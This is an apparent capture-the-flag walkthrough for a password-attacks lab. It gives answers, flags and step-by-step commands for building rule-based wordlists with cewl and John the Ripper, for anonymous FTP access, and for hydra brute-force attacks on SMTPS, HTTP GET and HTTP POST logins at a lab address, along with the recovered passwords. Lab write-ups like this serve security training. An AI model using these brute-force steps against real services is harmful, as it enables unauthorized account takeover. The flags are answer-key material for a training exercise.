## Task - 6: Offline Attacks - 

**Q: What syntax would you use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@?**

Answer: Az"[0-9][0-9]"^[!@]

## Task - 7: Deploy the VM , just reading 

## Task -8 : Online password attacks

**Q: Can you guess the FTP credentials without brute-forcing? What is the flag?**

Answer: THM{d0abe799f25738ad739c20301aed357b}

Run following command : 
ftp $your_IP
password : anonymous
Hit enter again 
ls (to see files),  and get filename
exit. (you'll have file in current direct flag.txt , cat flag.txt)

**In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the**
**previous task. email: pittman@clinic.thmredteam.com against 10.10.126.195:465 (SMTPS)**

**Q: What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].**

Answer: !multidisciplinary00

Solution: use this command to generate custom passwrod from this website : cewl -w wordlist.txt -d 8 -m 5 https://clinic.thmredteam.com/
--> nano /etc/john/john.conf
--> add this rule as mentioned in question in john  configuration file : [List.Rule:Myrules] Az"[0-9][0-9]"^[!@]
--> run this command john --wordlist=wordlist.txt --rules=myrules --stdout > dictionary.txt
(john will create rule based new word list following rules mentioned in john and from the wordlist of website : rule-based wordlist now you've)
--> hydra -l pittman@clinic.thmredteam.com -P dictionary.txt smtp://10.10.126.195:465 -v

**Q: Perform a brute-forcing attack against the phillips account for the login page at http://10.10.126.195/login-get using hydra? What is the flag?**

Answer: THM{33c5d4954da881814420f3ba39772644}

Solution: run the coomand : hydra -l phillips -P wordlist.lst 10.10.126.195 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
You'll find the password below : 80][http-get-form] host: 10.10.126.195   login: phillips   password: Paracetamol
access the url and you'll have flag

**Q: Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.126.195/login-post/. What is the flag?**

**Note: use the clinic.lst dictionary in generating and expanding the wordlist!**

Answer: THM{f8e3750cc0ccbb863f2706a3b2933227}

Solution: john --wordlist=clinic_wordlist.lst --rules=single-extra -stdout > newwordlist.lst ( to generate rule-based wordlist)
To find the password : hydra -l burgess -P newdictionary.lst 10.10.126.195 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -v
Password : OxytocinnicotyxO
Use this password to login onto the link  and have flag.
